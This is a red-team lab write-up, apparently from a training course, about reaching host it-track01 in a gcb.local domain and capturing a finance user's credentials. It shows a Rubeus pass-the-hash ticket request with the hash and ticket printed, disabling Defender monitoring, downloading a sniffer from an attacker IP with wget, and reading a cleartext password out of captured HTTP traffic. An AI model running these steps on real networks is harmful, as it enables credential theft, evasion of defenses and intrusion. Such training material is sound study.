---
layout: default
---

## it-track01.it.gcb.local 192.168.250.22

The principal idea of this lab it's access to it-track01 with administrator privileges and hunt for more information related to finance section. 


### 1. Access to it-track01.it.gcb.local 
```
PS C:\Users\itemployee15> cd C:\tools\                                                                                                                                                                                                                                         PS C:\tools> .\Rubeus.exe asktgt /domain:it.gcb.local /user:trackadmin /ntlm:1494b6a6d30e5c747020b979a166501f /ptt                                                                                                                                                                                                                                                                                                                                                                                                                                               ______        _                                                                                                                                                                                                                                                               (_____ \      | |                                                                                                                                                                                                                                                               _____) )_   _| |__  _____ _   _  ___                                                                                                                                                                                                                                          |  __  /| | | |  _ \| ___ | | | |/___)                                                                                                                                                                                                                                         | |  \ \| |_| | |_) ) ____| |_| |___ |                                                                                                                                                                                                                                         |_|   |_|____/|____/|_____)____/(___/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         v2.2.1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      [*] Action: Ask TGT                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           [*] Using rc4_hmac hash: 1494b6a6d30e5c747020b979a166501f                                                                                                                                                                                                                      [*] Building AS-REQ (w/ preauth) for: 'it.gcb.local\trackadmin'                                                                                                                                                                                                                [*] Using domain controller: 192.168.4.2:88                                                                                                                                                                                                                                    [+] TGT request successful!                                                                                                                                                                                                                                                    [*] base64(ticket.kirbi):                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           doIFdjCCBXKgAwIBBaEDAgEWooIEiTCCBIVhggSBMIIEfaADAgEFoQ4bDElULkdDQi5MT0NBTKIhMB+g                                                                                                                                                                                               AwIBAqEYMBYbBmtyYnRndBsMaXQuZ2NiLmxvY2Fso4IEQTCCBD2gAwIBEqEDAgECooIELwSCBCshaSo3                                                                                                                                                                                               XSkOXLo72nFhjPE/ntg+AII/OZd87kD826iiaDBUquAJHwxUeuLPKtj/WQHrRUNXTFoqUEip0NzH/VPH                                                                                                                                                                                               BMc37ScxiEVvgoJfD1ZzjBgeKWzKeRCcz4lVrd6+dC9CTRsT0KPY8brx7FY9A8wHG5qz4yxBjwwcA6dv                                                                                                                                                                                               mUK1na6chKnWiFoTroyeqr7nPYItn56J31376MEW37wjYqF+Rkmbm4tL7QqNIhJm1rVNdE636jkpAClj                                                                                                                                                                                               cCIPUbniNa+zyp02bhpEKXgA1DL6lY3E+5mHtluYgg0CgzBtwFBT3s4lvCFgErfDAFqPDBlTm1qqR7j3                                                                                                                                                                                               jXzxNVjTjDatEc+6lVHvZwsQ342Okl98//aAtu16RdUvAE+S00vU3j9hmiTuQAaqaisRinytaMBGrJ05                                                                                                                                                                                               riYzZ97VREjzOSS3nGv2Td0QLc8oUyRuPE3zkhj6Lrt3VV5DjdQzaT+M3dR7VES+LSyK3NVx4xC61oUd                                                                                                                                                                                               hWvipf68r3U8v2zmbyXFtO50ZfDsJq/9IppSE4w40/bGGKM2U27pSs3aP5qJ0u1wS2VlmniUbMp2SX/m                                                                                                                                                                                               EVuthTaj+01tFfPY9Idly8jUwBmyUE6R7b5MdP1zD4YE0UO0yjp0xayFTM5YGQO7FkF0T6kOlsB3Ouu5                                                                                                                                                                                               1JMqZHFkkjegS7QFm56lNoW1lF7iM8vxT5v4cIcD3nnZZxntQmWBdREBkYaY96B2Uq1xeyNq9s2KeHer                                                                                                                                                                                               BISl3Kd3t6SiVaBJaKip3fm24WH9wtF+YCAWeNOzMuOM9iefKUvVQA3CL/Zx8c4RMyp+EhDCf6AIxWVu                                                                                                                                                                                               z4i+Jf1+3VL+S5t1Y93Pzh0TgFENKk5qOq8sTqc2UgU9nSiIKSnXOHB99wUcb7Rxri/N1O7/bAUdAvj7                                                                                                                                                                                               H69KAjpUQTV6Gvyp9m3uetauVLvRmCImE8VqlnC/qFk/HRCmU1pjstISNcrD53g/pvF+pq/eJyCax4DJ                                                                                                                                                                                               ejehiBXKDwG0qDU1UMQQdQK57XSP00GTcUb4sZcMlN7QDAXzRGcOddgRfiQ3ZcHPYqaqVzQzQ5VsRlAD                                                                                                                                                                                               3iV0ePuqVJpKxMD1Lr+7m9mX8gymgWuVSvup4VlA0CVUGOipLDMkPNarcAQZ+WU6JSvk5fEeU0caXK8I                                                                                                                                                                                               phlRo1MZ6EqPWw1/54iVSzA+toIAp2X6yuopBQOnaj/f/yQM/3MtegLtEpGJ9NaUuv9nP0uS4NQSGng0                                                                                                                                                                                               XZwXccAxfMqvk/ico/oRR//DgmJVdlLJ1Bnsf4Km4GqwGdd4e4RqCWm19cvEGbD5ubuVfdqKoCfcl4xM                                                                                                                                                                                               Oxm08EdgPYI0c1rWOZgUmOFFacxmnyVoJST0Rux2GmA9ypqAsHfiHDJJonFWfdDaSPje9yXEqkxhpULp                                                                                                                                                                                               1aasQu5NFl7jkHtb5pRYGQaZvLisUgDK6R+43ymzAoggD6EIHzOcw/QG/qOB2DCB1aADAgEAooHNBIHK                                                                                                                                                                                               fYHHMIHEoIHBMIG+MIG7oBswGaADAgEXoRIEEMeUg6vEgo2WpTd0j69nUZOhDhsMSVQuR0NCLkxPQ0FM                                                                                                                                                                                               ohcwFaADAgEBoQ4wDBsKdHJhY2thZG1pbqMHAwUAQOEAAKURGA8yMDI0MDcyNDEwNTkwNlqmERgPMjAy                                                                                                                                                                                               NDA3MjQyMDU5MDZapxEYDzIwMjQwNzMxMTA1OTA2WqgOGwxJVC5HQ0IuTE9DQUypITAfoAMCAQKhGDAW                                                                                                                                                                                               GwZrcmJ0Z3QbDGl0LmdjYi5sb2NhbA==                                                                                                                                                                                                                                         [+] Ticket successfully imported!                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ServiceName              :  krbtgt/it.gcb.local                                                                                                                                                                                                                                ServiceRealm             :  IT.GCB.LOCAL                                                                                                                                                                                                                                       UserName                 :  trackadmin                                                                                                                                                                                                                                         UserRealm                :  IT.GCB.LOCAL                                                                                                                                                                                                                                       StartTime                :  7/24/2024 3:59:06 AM                                                                                                                                                                                                                               EndTime                  :  7/24/2024 1:59:06 PM                                                                                                                                                                                                                               RenewTill                :  7/31/2024 3:59:06 AM                                                                                                                                                                                                                               Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable                                                                                                                                                                                    KeyType                  :  rc4_hmac                                                                                                                                                                                                                                           Base64(key)              :  x5SDq8SCjZalN3SPr2dRkw==                                                                                                                                                                                                                           ASREP (key)              :  1494B6A6D30E5C747020B979A166501F                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                PS C:\tools> Enter-PSSession -ComputerName it-track01.it.gcb.local                                                                                                                                                                                                             [it-track01.it.gcb.local]: PS C:\Users\trackadmin\Documents> whoami                                                                                                                                                                                                            it\trackadmin                                                                                                                                                                                                                                                                  [it-track01.it.gcb.local]: PS C:\Users\trackadmin\Documents> whoami /all                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      USER INFORMATION                                                                                                                                                                                                                                                               ----------------                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              User Name     SID                                                                                                                                                                                                                                                              ============= =============================================                                                                                                                                                                                                                    it\trackadmin S-1-5-21-948911695-1962824894-4291460450-1118                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  GROUP INFORMATION                                                                                                                                                                                                                                                              -----------------                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             Group Name                                 Type             SID          Attributes                                                                                                                                                                                            ========================================== ================ ============ ===============================================================                                                                                                                                       Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group                                                                                                                                                    BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner                                                                                                                                       BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group                                                                                                                                                    NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group                                                                                                                                                    NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group                                                                                                                                                    NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group                                                                                                                                                    Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group                                                                                                                                                    Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                          

```

### 2. Hunt for networks connections to application server

I detected the bitname application at port 80:

```
[it-track01.it.gcb.local]: PS C:\> netstat -an | select-string LISTEN

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49689          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49694          0.0.0.0:0              LISTENING
  TCP    127.0.0.1:3001         0.0.0.0:0              LISTENING
  TCP    127.0.0.1:3002         0.0.0.0:0              LISTENING
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING
  TCP    192.168.4.111:139      0.0.0.0:0              LISTENING
  TCP    [::]:80                [::]:0                 LISTENING
  TCP    [::]:135               [::]:0                 LISTENING
  TCP    [::]:443               [::]:0                 LISTENING
  TCP    [::]:445               [::]:0                 LISTENING
  TCP    [::]:5985              [::]:0                 LISTENING
  TCP    [::]:47001             [::]:0                 LISTENING
  TCP    [::]:49664             [::]:0                 LISTENING
  TCP    [::]:49665             [::]:0                 LISTENING
  TCP    [::]:49666             [::]:0                 LISTENING
  TCP    [::]:49667             [::]:0                 LISTENING
  TCP    [::]:49669             [::]:0                 LISTENING
  TCP    [::]:49689             [::]:0                 LISTENING
  TCP    [::]:49694             [::]:0                 LISTENING


```
So It's possible use a powershell script in order to listen TCP inbound and outbound HTTP request:

```
[it-track01.it.gcb.local]: PS C:\Users\trackadmin\Documents> Set-MpPreference -DisableRealtimeMonitoring $true
[it-track01.it.gcb.local]: PS C:\Users\trackadmin\Documents>
[it-track01.it.gcb.local]: PS C:\Users\trackadmin\Documents> wget http://192.168.100.15:443/Sniffer.ps1 -OutFile C:\Sniffer.ps1
[it-track01.it.gcb.local]: PS C:\Users\trackadmin\Documents> cd C:\
[it-track01.it.gcb.local]: PS C:\> ls


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/5/2019   8:24 PM                Bitnami
d-----        10/2/2020   4:49 AM                PerfLogs
d-r---         9/5/2019   7:00 AM                Program Files
d-----        9/15/2018  12:21 AM                Program Files (x86)
d-----        9/19/2021   3:50 AM                Transcripts
d-r---         6/5/2019   6:35 AM                Users
d-----        2/15/2024   5:09 AM                Windows
-a----         6/5/2019   8:31 PM           1024 .rnd
-a----        7/24/2024   4:04 AM          13810 Sniffer.ps1

```

Use the sniffer in order to capture the WEB network traffic:
```
[it-track01.it.gcb.local]: PS C:\> .\Sniffer.ps1 -LocalIP 192.168.4.111 -Protocol TCP -Port 80 -Seconds 10 2>$null
Local IP: 192.168.4.111

Press ESC to stop the packet sniffer ...

Time:           07/24/2024 04:05:47
Version:        4                       Protocol:       6 = TCP
Destination:    192.168.42.14           Source:         192.168.4.111
DestPort:       54054                   SourcePort:     80
Sequence:       697770426               AckNumber:      371510397
Window:         8212                    Flags:          <ACK>
Service:
Data:
----------------------------------------------------------------------
Time:           07/24/2024 04:05:47
Version:        4                       Protocol:       6 = TCP
Destination:    192.168.4.111           Source:         192.168.42.14
DestPort:       80                      SourcePort:     54054
Sequence:       371510396               AckNumber:      697770426
Window:         8212                    Flags:          <FIN><ACK>
Service:        http
Data:
----------------------------------------------------------------------
Time:           07/24/2024 04:05:47
Version:        4                       Protocol:       6 = TCP
Destination:    192.168.42.14           Source:         192.168.4.111
DestPort:       54056                   SourcePort:     80
Sequence:       1387987708              AckNumber:      3672971992
Window:         65535                   Flags:          <SYN><ACK>
Service:
Data:
----------------------------------------------------------------------
Time:           07/24/2024 04:05:47
Version:        4                       Protocol:       6 = TCP
Destination:    192.168.4.111           Source:         192.168.42.14
DestPort:       80                      SourcePort:     54056
Sequence:       3672971991              AckNumber:      0
Window:         64240                   Flags:          <SYN>
Service:        http
Data:
----------------------------------------------------------------------
Time:           07/24/2024 04:05:47
Version:        4                       Protocol:       6 = TCP
Destination:    192.168.4.111           Source:         192.168.42.14
DestPort:       80                      SourcePort:     54056
Sequence:       3672971992              AckNumber:      1387987709
Window:         8212                    Flags:          <ACK>
Service:        http
Data:
----------------------------------------------------------------------
Time:           07/24/2024 04:05:47
Version:        4                       Protocol:       6 = TCP
Destination:    192.168.4.111           Source:         192.168.42.14
DestPort:       80                      SourcePort:     54056
Sequence:       3672971992              AckNumber:      1387987709
Window:         8212                    Flags:          <PSH><ACK>
Service:        http
Data: POST./.HTTP/1.1..User-Agent:.Mozilla/5.0.(Windows.NT;.Windows.NT.10.0;.en-US).WindowsPowerShell/5.1.17763.5458..Content-Type:.application/x-www-form-urlencoded..Host:.192.168.4.111..Content-Length:.65..Expect:.100-continue....
----------------------------------------------------------------------
Time:           07/24/2024 04:05:47
Version:        4                       Protocol:       6 = TCP
Destination:    192.168.42.14           Source:         192.168.4.111
DestPort:       54056                   SourcePort:     80
Sequence:       1387987709              AckNumber:      3672972218
Window:         8212                    Flags:          <PSH><ACK>
Service:
Data: HTTP/1.1.100.Continue....
----------------------------------------------------------------------
Time:           07/24/2024 04:05:47
Version:        4                       Protocol:       6 = TCP
Destination:    192.168.4.111           Source:         192.168.42.14
DestPort:       80                      SourcePort:     54056
Sequence:       3672972218              AckNumber:      1387987734
Window:         8212                    Flags:          <PSH><ACK>
Service:        http
Data: password=300YearsAndStillG0ing%24trong&username=finance%5Cvanessa
----------------------------------------------------------------------
Time:           07/24/2024 04:05:47
Version:        4                       Protocol:       6 = TCP
Destination:    192.168.42.14           Source:         192.168.4.111
DestPort:       54056                   SourcePort:     80
Sequence:       1387987734              AckNumber:      3672972283
Window:         8212                    Flags:          <PSH><ACK>
Service:
Data: HTTP/1.1.200.OK..Date:.Wed,.24.Jul.2024.11:05:47.GMT..Server:.Apache..X-Frame-Options:.SAMEORIGIN..Last-Modified:.Thu,.06.Jun.2019.03:42:40.GMT..ETag:."7dc-58a9f8178cf7b"..Accept-Ranges:.bytes..Vary:.Accept-Encoding..Transfer-Encoding:.chunked..Content-Type:.text/html....7dc..<!DOCTYPE.HTML.PUBLIC."-//W3C//DTD.HTML.4.01//EN"."http://www.w3.org/TR/html4/strict.dtd">..<html>....<head>......<title>Bitnami.Redmine.Stack</title>......<link.href="bitnami.css".media="all".rel="Stylesheet".type="text/css"./>......<meta.http-equiv="content-type".content="text/html;.charset=UTF-8">......<meta.http-equiv="content-type".content="application/xhtml+xml;.charset=UTF-8">......<meta.http-equiv="content-style-type".content="text/css">......<meta.http-equiv="expires".content="0">....</head>....<body>......<div.class="container">........<div.id="header">..........<table.class="tableHeader">..
----------------------------------------------------------------------
Time:           07/24/2024 04:05:47
Version:        4                       Protocol:       6 = TCP
Destination:    192.168.42.14           Source:         192.168.4.111
DestPort:       54056                   SourcePort:     80
Sequence:       1387988619              AckNumber:      3672972283
Window:         8212                    Flags:          <PSH><ACK>

```


### 3. Extract the credentials for finance vanessa account

FInally in the inbound request we can found the following authentication data that we are going to reuse on the next lab access:

```
password=300YearsAndStillG0ing$trong
username=finance\vanessa
```

[back](./section3.html)
